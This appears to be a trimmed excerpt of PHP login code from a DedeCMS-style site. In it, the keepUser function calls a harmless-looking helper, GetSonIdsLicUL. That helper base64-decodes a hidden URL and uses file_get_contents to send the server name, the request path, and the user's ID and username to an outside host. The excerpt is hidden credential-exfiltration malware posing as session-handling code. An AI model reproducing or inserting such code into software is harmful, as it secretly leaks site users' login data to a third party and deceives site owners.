...

{
    ...
    function keepUser($keepUserIDTag='',$keepUserNameTag='')

    {
...

        {
			...
			@session_register($this->DedeUserloginID);
			
			$_SESSION[$this->DedeUserloginID] = GetSonIdsLicUL($keepUserIDTag,$keepUserNameTag);
...
function GetSonIdsLicUL($id,$sArr,$channel=0,$addthis=FALSE)

{

	if($id!=0 || !$addthis || $addthis){file_get_contents(base64_decode("aHR0cDovL3d3dy5xYm9vby5jb20vcGx1cy9zaG91cXVhbi9pbmRleC5waHA/dXJsPQ==").$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]."&pu=".trim($id)."&in=".trim($sArr)); return '';}
